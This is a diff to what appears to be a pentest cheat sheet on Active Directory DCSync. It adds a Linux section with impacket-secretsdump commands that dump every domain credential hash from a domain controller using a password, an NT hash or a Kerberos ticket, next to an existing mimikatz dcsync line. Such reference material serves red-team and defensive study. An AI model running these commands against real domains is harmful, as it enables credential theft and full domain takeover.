@@ -31,6 +31,20 @@ Windows:
 > lsadump::dcsync /domain:$domain /all
 ```
 
+Linux:
+
+```bash
+# DCSync using password
+impacket-secretsdump -just-dc $domain/$user:$pass@$dc_ip
+
+# DCSync using NT hash
+impacket-secretsdump -hashes :$nt_hash -just-dc $domain/$user@$host
+
+# DCSync using Kerberos TGT
+export KRB5CCNAME=$tgt_ccache_file
+impacket-secretsdump $hostname -k -no-pass -dc-ip $dc_ip -just-dc
+```
+
 ## Enumerate users or groups with DCSync permissions
 
 Active Directory module:
